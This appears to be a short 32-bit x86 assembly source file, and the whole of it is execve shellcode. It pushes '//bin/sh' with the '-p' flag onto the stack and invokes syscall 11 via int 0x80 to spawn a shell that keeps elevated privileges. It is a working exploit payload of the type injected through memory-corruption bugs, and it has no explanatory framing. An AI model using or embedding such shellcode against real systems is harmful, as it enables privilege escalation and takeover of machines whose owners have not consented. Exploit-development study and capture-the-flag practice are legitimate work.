bits 32
global main

section .text
    main: 
        xor eax,eax
        xor ebx,ebx
        xor ecx,ecx
        xor edx,edx

        mov al, 0xb  ; syscall number for execve is 11
        push edx    ;  null terminator
        push word "-p"
        mov ecx, esp     

        push edx  ;  null terminator
        push "n/sh"
        push "//bi"
        mov ebx, esp   


        push edx 
        push ecx
        push ebx 

        mov ecx , esp 
        int 0x80